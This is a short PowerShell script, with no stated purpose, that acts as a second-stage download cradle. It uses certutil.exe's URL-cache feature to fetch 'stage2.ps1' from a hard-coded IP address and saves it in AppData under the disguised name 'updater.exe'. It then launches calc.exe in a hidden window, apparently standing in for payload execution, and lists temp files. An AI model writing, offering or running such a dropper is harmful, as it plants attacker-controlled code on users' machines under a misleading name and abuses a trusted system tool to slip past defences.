
[CmdletBinding()]
param(
    [string]$EndpointUrl = 'https://198.51.100.174/stage2.ps1'
)
certutil.exe -urlcache -split -f $EndpointUrl "$env:APPDATA\updater.exe"
Start-Process -FilePath "calc.exe" -WindowStyle Hidden -ErrorAction SilentlyContinue
Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
